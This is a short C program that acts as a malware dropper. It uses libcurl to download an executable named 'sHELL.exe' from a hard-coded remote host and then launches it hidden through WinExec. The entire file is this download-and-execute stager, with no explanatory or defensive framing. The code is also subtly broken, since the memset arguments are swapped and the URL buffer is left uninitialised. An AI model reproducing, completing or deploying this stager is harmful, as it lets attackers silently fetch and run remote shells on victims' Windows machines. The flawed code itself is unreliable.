#define PTL "https"
#define DMN "10.10.10.10"
#define FLE "sHELL.exe"

#define CURL_STATICLIB
#include <stdio.h>
#include <curl/curl.h>

size_t write_callback(void *buffer, size_t size, size_t nitems, void *userp){
  FILE *file = (FILE*)userp;
  size_t write;
  write = fwrite(buffer, size, nitems, file);
  return write;
}

int main(void)
{
  CURL *curl;
  CURLcode res;

  FILE *outFile;
  outFile=fopen(FLE, "wb");

  char finalURL[512];
  memset(finalURL, sizeof(finalURL), '\0');

  strcat( finalURL, PTL);
  strcat( finalURL, "://");
  strcat( finalURL, DMN);
  strcat( finalURL, "/");
  strcat( finalURL, FLE);

  curl = curl_easy_init();
  
  if(curl){
    curl_easy_setopt(curl, CURLOPT_URL, finalURL);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, outFile);
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    fclose(outFile);
  }

  WinExec( FLE, 0 );
  return 0;
}
